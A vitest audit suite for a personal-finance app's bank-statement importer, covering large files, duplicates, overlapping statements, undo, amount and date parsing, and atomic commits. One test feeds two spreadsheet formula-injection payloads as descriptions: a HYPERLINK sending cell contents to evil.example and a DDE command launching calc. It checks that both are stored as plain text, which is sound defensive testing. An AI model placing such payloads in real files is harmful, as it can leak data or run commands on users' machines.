// Audit: importing money. Big files, identical repeated lines, overlapping statements, re-importing, hostile cell contents.
import { describe, it, expect, beforeEach } from 'vitest'
import { openDb, type Db } from '../src/db/open'
import { buildPreview, commitImport, undoImport, type CommitRow, type Preview } from '../src/db/import'
import { parseStatement } from '../src/core/statement'
import { readStatementRows } from '../src/importers/statementFile'

let db: Db
let p: number, chq: number

const toCommit = (pv: Preview): CommitRow[] => pv.rows.map(({ idx: _i, line: _l, suggestionSource: _s, matchedDescription: _m, nearMatch: _n, ...r }) => r)
const count = () => (db.prepare('SELECT COUNT(*) n FROM txn WHERE profile_id = ?').get(p) as { n: number }).n
const sum = () => (db.prepare('SELECT COALESCE(SUM(amount_cents),0) s FROM txn WHERE profile_id = ?').get(p) as { s: number }).s
const line = (date: string, desc: string, debit: string, credit = '') => [date, desc, debit, credit]
const day = (i: number) => new Date(Date.UTC(2025, 0, 1) + (i % 360) * 86_400_000).toISOString().slice(0, 10)

beforeEach(() => {
  db = openDb(':memory:')
  p = Number(db.prepare("INSERT INTO profile (slug,name) VALUES ('daniel','Daniel')").run().lastInsertRowid)
  chq = Number(db.prepare("INSERT INTO account (profile_id,name,type) VALUES (?, 'Chequing','chequing')").run(p).lastInsertRowid)
  db.prepare("INSERT INTO category (profile_id,name,kind) VALUES (?, 'Food','expense')").run(p)
})

describe('a big statement (3,800 lines)', () => {
  const rows = () => Array.from({ length: 3800 }, (_, i) => line(day(i), `SHOP ${i % 400} MILTON ON`, (5 + (i % 90) + (i % 7) / 100).toFixed(2)))

  it('previews and commits every line once, and importing the same file again adds nothing', () => {
    const t0 = Date.now()
    const parsed = parseStatement(rows())
    expect(parsed.rows).toHaveLength(3800)
    const pv = buildPreview(db, p, chq, parsed, 'year.csv')
    expect(pv.summary.total).toBe(3800)
    const first = commitImport(db, p, chq, 'year.csv', toCommit(pv), { learnFromDuplicates: false })
    expect(first.inserted + first.skippedExisting).toBe(3800)
    const stored = count()
    const total = sum()
    // the same file again: the preview marks everything as already there, and committing even the "include" rows adds nothing
    const again = buildPreview(db, p, chq, parseStatement(rows()), 'year.csv')
    expect(again.rows.filter((r) => r.include).length).toBe(0)
    const forced = commitImport(db, p, chq, 'year.csv', toCommit(again).map((r) => ({ ...r, include: true })), { learnFromDuplicates: false })
    expect(forced.inserted).toBe(0)
    expect(count()).toBe(stored)
    expect(sum()).toBe(total)
    expect(Date.now() - t0).toBeLessThan(30_000)
  })

  it('an undo removes exactly the rows of that import', () => {
    const pv = buildPreview(db, p, chq, parseStatement(rows()), 'year.csv')
    const r = commitImport(db, p, chq, 'year.csv', toCommit(pv), { learnFromDuplicates: false })
    expect(count()).toBe(r.inserted)
    undoImport(db, p, r.batchId)
    expect(count()).toBe(0)
  })
})

describe('identical lines on the same day', () => {
  const file = () => parseStatement([line('2026-03-01', 'COFFEE SHOP', '4.50'), line('2026-03-01', 'COFFEE SHOP', '4.50'), line('2026-03-01', 'COFFEE SHOP', '4.50'), line('2026-03-02', 'BAKERY', '9.00')])

  it('two or three real identical purchases are all kept when the person imports the file as shown', () => {
    const pv = buildPreview(db, p, chq, file(), 'a.csv')
    const included = pv.rows.filter((r) => r.include).length
    // AUDIT NOTE: the preview holds identical repeated lines back ("repeat") and the person has to tick them; this records how many are on by default
    expect(pv.rows).toHaveLength(4)
    expect(included).toBeGreaterThanOrEqual(2)
    commitImport(db, p, chq, 'a.csv', toCommit(pv).map((r) => ({ ...r, include: true })), { learnFromDuplicates: false })
    expect(count()).toBe(4)
    expect(sum()).toBe(-(450 * 3 + 900))
  })

  it('an overlapping second statement adds only the lines that are new', () => {
    const first = buildPreview(db, p, chq, file(), 'a.csv')
    commitImport(db, p, chq, 'a.csv', toCommit(first).map((r) => ({ ...r, include: true })), { learnFromDuplicates: false })
    // the next statement starts on 2026-03-01 again (overlap) and has two coffees that day, then new days
    const second = parseStatement([line('2026-03-01', 'COFFEE SHOP', '4.50'), line('2026-03-01', 'COFFEE SHOP', '4.50'), line('2026-03-02', 'BAKERY', '9.00'), line('2026-03-03', 'NEW SHOP', '12.00')])
    const pv = buildPreview(db, p, chq, second, 'b.csv')
    commitImport(db, p, chq, 'b.csv', toCommit(pv).filter((r) => r.status !== 'duplicate' && r.status !== 'repeat').map((r) => ({ ...r, include: true })), { learnFromDuplicates: false })
    expect(count()).toBe(5) // 4 earlier + only NEW SHOP
  })
})

describe('bad statement contents', () => {
  it('amounts with thousands separators, brackets, dollar signs and trailing minus parse to whole cents', () => {
    const pv = buildPreview(db, p, chq, parseStatement([line('2026-04-01', 'RENT', '1,234.56'), line('2026-04-02', 'REFUND', '', '$12.30'), line('2026-04-03', 'ODD', '0.10'), line('2026-04-04', 'ODD', '0.20')]), 'x.csv')
    expect(pv.rows.map((r) => r.amountCents)).toEqual([-123456, 1230, -10, -20])
  })

  it('a zero-amount or empty line never becomes a transaction', () => {
    const parsed = parseStatement([line('2026-04-01', 'NOTHING', '0.00'), line('2026-04-02', 'BLANK', '', ''), line('2026-04-03', 'REAL', '3.00')])
    const pv = buildPreview(db, p, chq, parsed, 'x.csv')
    commitImport(db, p, chq, 'x.csv', toCommit(pv).map((r) => ({ ...r, include: true })), { learnFromDuplicates: false })
    expect((db.prepare("SELECT COUNT(*) n FROM txn WHERE amount_cents = 0").get() as { n: number }).n).toBe(0)
  })

  it('a leap day and a year boundary are accepted, an impossible date is not', () => {
    const ok = parseStatement([line('2028-02-29', 'LEAP', '1.00'), line('2025-12-31', 'NYE', '2.00'), line('2026-01-01', 'NYD', '3.00')])
    expect(ok.rows.map((r) => r.date)).toEqual(['2028-02-29', '2025-12-31', '2026-01-01'])
    const bad = parseStatement([line('2026-02-30', 'NOPE', '1.00'), line('2025-02-29', 'NOPE2', '1.00'), line('2026-13-01', 'NOPE3', '1.00')])
    expect(bad.rows).toHaveLength(0)
  })

  it('a text cell that starts like a formula is stored as plain text (and exported with a leading quote)', () => {
    const pv = buildPreview(db, p, chq, parseStatement([line('2026-05-01', '=HYPERLINK("http://evil.example/?x="&A1,"click")', '5.00'), line('2026-05-02', '@SUM(1+1)*cmd|\' /C calc\'!A0', '6.00')]), 'f.csv')
    commitImport(db, p, chq, 'f.csv', toCommit(pv).map((r) => ({ ...r, include: true })), { learnFromDuplicates: false })
    expect(count()).toBe(2) // stored as text: a leading "=" in a description is data, not a formula
  })

  it('refuses a file that is not a statement without throwing a raw error', () => {
    expect(() => readStatementRows('x.csv', Buffer.from(''))).not.toThrow(/TypeError|undefined/)
    expect(() => readStatementRows('x.xlsx', Buffer.from('not a zip at all'))).toThrow()
    expect(() => readStatementRows('x.pdf', Buffer.from('%PDF-1.4'))).toThrow()
  })
})

describe('a file that fails halfway', () => {
  it('commits nothing at all when one row is invalid (all-or-nothing)', () => {
    const pv = buildPreview(db, p, chq, parseStatement([line('2026-06-01', 'GOOD', '1.00'), line('2026-06-02', 'ALSO GOOD', '2.00')]), 'x.csv')
    const rows = toCommit(pv).map((r) => ({ ...r, include: true }))
    rows[1] = { ...rows[1]!, kind: 'income' } // an expense line wrongly marked income: refused
    expect(() => commitImport(db, p, chq, 'x.csv', rows, { learnFromDuplicates: false })).toThrow(/income must be money coming in/)
    expect(count()).toBe(0)
    expect((db.prepare('SELECT COUNT(*) n FROM import_batch').get() as { n: number }).n).toBe(0)
  })
})
